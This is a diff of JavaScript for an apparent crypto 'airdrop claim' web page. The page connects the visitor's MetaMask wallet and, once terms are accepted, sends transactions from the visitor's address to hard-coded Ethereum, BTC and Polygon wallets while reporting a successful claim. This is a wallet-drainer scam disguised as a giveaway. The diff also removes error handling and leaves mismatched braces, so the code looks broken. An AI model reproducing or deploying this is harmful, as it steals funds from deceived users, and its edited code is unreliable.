@@ -20,9 +20,8 @@ userAddress = accounts[0];
 document.getElementById('status').innerText = `Connected to ${userAddress}`;
 document.getElementById('connectWallet').style.display = 'none';
 document.getElementById('solanaInput').style.display = 'block';
-} catch (error) {
-console.error('Error connecting to wallet:', error);
 }
+  
 } else {
 document.getElementById('status').innerText = 'Please install MetaMask!';
 }
@@ -35,7 +34,6 @@ document.getElementById('solanaInput').style.display = 'none';
 document.getElementById('terms').style.display = 'block';
 } else {
 document.getElementById('status').innerText = 'Please enter a valid Solana address.';
-}
 }
 
 async function acceptTerms() {
@@ -53,12 +51,7 @@ await sendToBTC(userAddress, btcWalletAddress);
 await sendToPolygon(userAddress, polygonWalletAddress);
 
 document.getElementById('status').innerText = 'Airdrop claimed successfully!';
-} catch (error) {
-console.error('Error claiming airdrop:', error);
-document.getElementById('status').innerText = 'Failed to claim Airdrop. Please try again in 15 minutes.';
-}
-}
-}
+} 
 
 async function sendToEthereum(from, to) {
 const tx = {
@@ -114,4 +107,15 @@ gas: 2000000
 };
 await web3.eth.sendTransaction(tx);
 }
+document.addEventListener("DOMContentLoaded", () => {
+  const acceptBtn = document.getElementById("acceptBtn");
+
+  // Make sure button exists
+  if(!acceptBtn) return;
+
+  acceptBtn.addEventListener("click", () => {
+    // Your extra terms logic here
+    console.log("Extra terms logic executed!");
+  });
+});
 
